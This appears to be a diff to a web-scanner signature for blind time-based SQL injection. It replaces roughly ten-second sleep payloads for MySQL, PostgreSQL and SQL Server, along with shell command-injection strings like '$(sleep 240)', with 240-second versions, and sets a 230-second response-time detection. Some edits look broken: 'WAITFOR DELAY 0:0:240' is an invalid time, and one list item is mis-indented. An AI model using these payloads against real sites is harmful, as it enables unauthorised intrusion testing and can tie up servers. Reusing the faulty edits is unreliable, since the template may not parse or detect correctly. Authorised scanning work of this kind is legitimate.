@@ -6,7 +6,7 @@ info:
 
 
 payloads:
-  - >-
+   - >-
     '
   - >-
     -
@@ -33,55 +33,56 @@ payloads:
   - >-
     /*
   - >-
-    /**/ AND sleep(10)
+    /**/ AND sleep(240)
   - >-
-    ' AND sleep(10)
+    ' AND sleep(240)
   - >-
-    /**/ AND SLEEP(10) /*‘ or SLEEP(10) or ‘“ or SLEEP(10) or “*/
+    /**/ AND SLEEP(240) /*‘ or SLEEP(240) or ‘“ or SLEEP(240) or “*/
   - >-
-    /**/ AND SLEEP(10) /*' or SLEEP(10) or '\" or SLEEP(10) or \"*/
+    /**/ AND SLEEP(240) /*' or SLEEP(240) or '\" or SLEEP(240) or \"*/
   - >-
-    /**/ AND IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR\"*/
+    /**/ AND IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(240))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(240)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(240)))OR\"*/
   - >-
-    'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR\"*/
+    'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(240))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(240)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(240)))OR\"*/
   - >-
-    /**/ AND if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'\"XOR(if(now()=sysdate(),sleep(10),0))OR\"*/
+    /**/ AND if(now()=sysdate(),sleep(240),0)/*'XOR(if(now()=sysdate(),sleep(240),0))OR'\"XOR(if(now()=sysdate(),sleep(240),0))OR\"*/
   - >-
-    'if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'\"XOR(if(now()=sysdate(),sleep(10),0))OR\"*/
+    'if(now()=sysdate(),sleep(240),0)/*'XOR(if(now()=sysdate(),sleep(240),0))OR'\"XOR(if(now()=sysdate(),sleep(240),0))OR\"*/
   - >-
-    /**/ AND /*$(sleep 10)`sleep 10``*/-sleep(10)#'/*$(sleep 10)`sleep 10` #*/||sleep(10)||'\"||sleep(10)||\"`
+    /**/ AND /*$(sleep 240)`sleep 240``*/-sleep(240)#'/*$(sleep 240)`sleep 240` #*/||sleep(240)||'\"||sleep(240)||\"`
   - >-
-    '/*$(sleep 10)`sleep 10``*/-sleep(10)#'/*$(sleep 10)`sleep 10` #*/||sleep(10)||'\"||sleep(10)||\"`
+    '/*$(sleep 240)`sleep 240``*/-sleep(240)#'/*$(sleep 240)`sleep 240` #*/||sleep(240)||'\"||sleep(240)||\"`
   - >-
-    /**/ AND /*$(sleep 10)`sleep 10``*/sleep(10)#'/*$(sleep 10)`sleep 10` #*/||sleep(10)||'\"||sleep(10)||\"`
+    /**/ AND /*$(sleep 240)`sleep 240``*/sleep(240)#'/*$(sleep 240)`sleep 240` #*/||sleep(240)||'\"||sleep(240)||\"`
   - >-
-    '/*$(sleep 10)`sleep 10``*/sleep(10)#'/*$(sleep 10)`sleep 10` #*/||sleep(10)||'\"||sleep(10)||\"`
+    '/*$(sleep 240)`sleep 240``*/sleep(240)#'/*$(sleep 240)`sleep 240` #*/||sleep(240)||'\"||sleep(240)||\"`
   - >-
-    /**/ AND (select*from(select(sleep(7*7)))a)
+    /**/ AND (select*from(select(sleep(10*24)))a)
   - >-
-    ,(select*from(select(sleep(20)))a)
+    ,(select*from(select(sleep(240)))a)
   - >-
-    '(select*from(select(sleep(20)))a)--V
+    '(select*from(select(sleep(240)))a)--V
   - >-
-    '(select*from(select(sleep(20)))a)'
+    '(select*from(select(sleep(240)))a)'
   - >-
-    '+(select*from(select(sleep(10)))a)+'
+    '+(select*from(select(sleep(240)))a)+'
   - >-
-    /**/ AND SLEEP(15)#
+    /**/ AND SLEEP(240)#
   - >-
-    'xor(if(now()=sysdate(),sleep(10),0))or'
+    'xor(if(now()=sysdate(),sleep(240),0))or'
   - >-
-    '; WAITFOR DELAY '0:0:13'--V
+    '; WAITFOR DELAY '0:0:240'--V
   - >-
-    ' WAITFOR DELAY '0:0:13'--V
+    ' WAITFOR DELAY '0:0:240'--V
   - >-
-    ' WAITFOR DELAY '0:0:13'
+    ' WAITFOR DELAY '0:0:240'
   - >-
-    /**/ pg_sleep(30)--V
+    /**/ pg_sleep(240)--V
   - >-
-    ||pg_sleep(30)--V
+    ||pg_sleep(240)--V
   - >-
-    '||pg_sleep(10)--V
+    '||pg_sleep(240)--V
+
 
 
 requests:
@@ -89,4 +90,4 @@ requests:
       - Path("[[.original]]{{.payload}}", "*")
     detections:
       - >-
-        RegexSearch("response", "mysql_fetch_|not a valid MySQL|not a legal PLSQL identifer|mysql_connect\(\)|(SELECT\s+[^:>]+\sFROM\s+[^:>]+\sWHERE\s+)|(at\s[[:alnum:]\/\._]+\sline\s\d+)|ociparse\(\):|must be a syntactically valid variable|CFSQLTYPE|Unknown column '|Microsoft OLE DB Provider for SQL|SQL QUERY FAILURE:|Syntax error.{1,50}in query|You have an error in your SQL syntax|Unclosed quotation mark") || ResponseTime() > 8
+        RegexSearch("response", "mysql_fetch_|not a valid MySQL|not a legal PLSQL identifer|mysql_connect\(\)|(SELECT\s+[^:>]+\sFROM\s+[^:>]+\sWHERE\s+)|(at\s[[:alnum:]\/\._]+\sline\s\d+)|ociparse\(\):|must be a syntactically valid variable|CFSQLTYPE|Unknown column '|Microsoft OLE DB Provider for SQL|SQL QUERY FAILURE:|Syntax error.{1,50}in query|You have an error in your SQL syntax|Unclosed quotation mark") || ResponseTime() > 230
